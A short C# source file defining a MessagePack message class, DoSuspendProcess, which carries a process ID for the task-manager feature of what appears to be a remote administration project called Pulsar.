using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoSuspendProcess : IMessage
    {
        [Key(1)]
        public int Pid { get; set; }
    }
}
